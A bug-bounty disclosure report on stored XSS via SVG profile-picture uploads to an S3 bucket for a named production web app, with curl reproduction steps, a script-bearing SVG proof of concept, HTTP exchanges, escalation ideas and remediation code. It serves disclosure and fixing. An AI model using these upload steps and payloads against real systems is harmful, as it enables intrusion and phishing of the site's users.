# Stored XSS via S3 Bucket — Profile Picture Upload

**Severity:** Medium — CVSS 3.1: AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (6.1)
**Class:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Stored XSS)
**Target:** `PATCH /api/v1/users/me/` → `tp-backend-evidence-prod-us-west-2.s3.amazonaws.com`
**Status:** Confirmed

---

## Summary

The Trustpoint AI application (`partner.trustpoint.ai`) allows users to upload arbitrary files as profile pictures via `PATCH /api/v1/users/me/` on `backend.trustpoint.ai`. No server-side content validation is performed — SVG files containing JavaScript are accepted and stored in the S3 bucket `tp-backend-evidence-prod-us-west-2`. The S3 bucket serves these files with `Content-Type: image/svg+xml` and **no** `Content-Disposition: attachment` header, causing browsers to render the SVG (and execute embedded scripts) when the presigned URL is visited directly. Additionally, the S3 bucket has CORS set to `Access-Control-Allow-Origin: *`, enabling cross-origin reads from any domain.

---

## Confirmed Findings from Live Testing

### 1. Unrestricted SVG Upload — Confirmed

Successfully uploaded an SVG containing `<script>` via the profile picture PATCH endpoint. The API accepted it without validation and returned a presigned S3 URL that serves it with `Content-Type: image/svg+xml`.

### 2. S3 Bucket Misconfiguration — Confirmed

| Header | Value | Risk |
|--------|-------|------|
| `Content-Type` | `image/svg+xml` (attacker-controlled) | Browser renders SVG with scripts |
| `Content-Disposition` | **Missing** | Browser renders inline instead of forcing download |
| `Access-Control-Allow-Origin` | `*` | Any origin can read S3 responses via fetch/XHR |
| `Access-Control-Allow-Methods` | `GET` | Allows cross-origin GET requests |

### 3. Main App Rendering — Safe (img tag)

The React app renders profile photos via `<img>` tags, which sandbox SVG and block script execution. The XSS only fires when the S3 presigned URL is opened directly.

### 4. Name Field Injection — Not Exploitable

HTML tags in `first_name`/`last_name` are stripped server-side (returned as empty strings). Restored to original values after testing.

### 5. CSP Analysis — Permissive

The main origin (`partner.trustpoint.ai`) CSP includes:
- `script-src: 'unsafe-inline' 'unsafe-eval'` — allows inline script execution
- `connect-src: tp-backend-evidence-prod-us-west-2.s3.amazonaws.com` — S3 bucket is trusted
- `media-src: tp-backend-evidence-prod-us-west-2.s3.amazonaws.com` — S3 content loadable
- `img-src: * data: blob:` — unrestricted image sources

If any code path renders S3 content inline on the main origin (iframe, embed, object, or `dangerouslySetInnerHTML`), the permissive CSP would allow script execution.

---

## Steps to Reproduce

1. **Authenticate** to `partner.trustpoint.ai` and obtain a valid `access_token` JWT.

2. **Upload malicious SVG** as profile picture:

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/users/me/' \
  -H 'Authorization: Bearer <access_token>' \
  -F 'profile_photo=@payload.svg;type=image/svg+xml'
```

Where `payload.svg` contains:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

3. **Retrieve the presigned S3 URL** from the API response or by calling:

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/users/me/' \
  -H 'Authorization: Bearer <access_token>' | jq '.profile_photo'
```

4. **Open the presigned S3 URL** in a browser. The SVG renders and JavaScript executes in the context of `tp-backend-evidence-prod-us-west-2.s3.amazonaws.com`.

---

## Proof of Concept

### Request

```http
PATCH /api/v1/users/me/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <redacted>
Content-Type: multipart/form-data; boundary=----FormBoundary

------FormBoundary
Content-Disposition: form-data; name="profile_photo"; filename="avatar.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
------FormBoundary--
```

### Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "<user-uuid>",
  "profile_photo": "https://tp-backend-evidence-prod-us-west-2.s3.amazonaws.com/...",
  ...
}
```

### S3 Response Headers (confirmed via curl)

```http
HTTP/1.1 200 OK
Content-Type: image/svg+xml
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET
```

No `Content-Disposition: attachment` header — browser renders inline.

---

## Impact

### Current Impact (S3 Origin XSS — P4)

- JavaScript executes on the S3 origin (`s3.amazonaws.com`), not the main application origin
- No application cookies are accessible from the S3 origin
- Attacker can phish victims using a trusted-looking AWS URL belonging to the target's infrastructure
- CORS `*` allows any website to read S3 responses, enabling exfiltration of S3-hosted data

### Escalation Potential (Main Origin XSS — P2/P1)

The following vectors could escalate to main origin XSS. They are **untested** but architecturally plausible based on code analysis:

1. **Document/Evidence Upload:** If the document viewer on `partner.trustpoint.ai` renders uploaded HTML/SVG inline (via iframe/embed), the permissive CSP (`unsafe-inline`, `unsafe-eval`) would allow full script execution on the main origin. The `documentPage` chunk includes a viewer component that loads S3 content.

2. **Message Field Injection:** The React app uses `dangerouslySetInnerHTML` with sanitizer functions (`dt()`, `ln()`) for rendering messages/comments. If the sanitizer is bypassable, injected HTML would execute on the main origin.

3. **Future Rendering Changes:** Any code change from `<img>` to `<embed>`, `<object>`, or `<iframe>` for avatar rendering would immediately escalate this to main origin XSS.

---

## Remediation

1. **Validate file content server-side** using magic bytes, not just Content-Type headers:

```python
import magic

ALLOWED_TYPES = {'image/png', 'image/jpeg', 'image/gif', 'image/webp'}

def validate_upload(file_bytes, declared_type):
    detected = magic.from_buffer(file_bytes, mime=True)
    if detected not in ALLOWED_TYPES:
        raise ValueError(f"File type {detected} not allowed")
```

2. **Set `Content-Disposition: attachment`** on all user-uploaded S3 objects to force download instead of inline rendering.

3. **Set a safe `Content-Type`** on S3 objects (force `image/png` or `application/octet-stream`) regardless of what the user declares.

4. **Restrict CORS** on the S3 bucket — replace `Access-Control-Allow-Origin: *` with the specific application origin (`https://partner.trustpoint.ai`).

5. **Re-encode uploaded images** through an image processing library (Pillow, Sharp) to strip any embedded code.

6. **Serve user content from an isolated domain** (e.g., `trustpoint-user-content.example.net`) with no cookies and a restrictive CSP.

7. **Tighten CSP on the main origin** — remove `unsafe-inline` and `unsafe-eval` from `script-src`.

---

## Bugcrowd VRT Classification

| Scenario | VRT Category | Priority |
|----------|-------------|----------|
| Self-XSS on S3 origin (current) | Stored XSS — Self-Only | P4 |
| XSS on S3 origin affecting other users | Stored XSS — Non-Self | P3 |
| Main origin XSS via document viewer | Stored XSS — Non-Self, Main Origin | P2 |
| Main origin XSS with session hijacking | Stored XSS — Non-Self, Main Origin | P1 |

---

## References

- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- [PortSwigger: File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
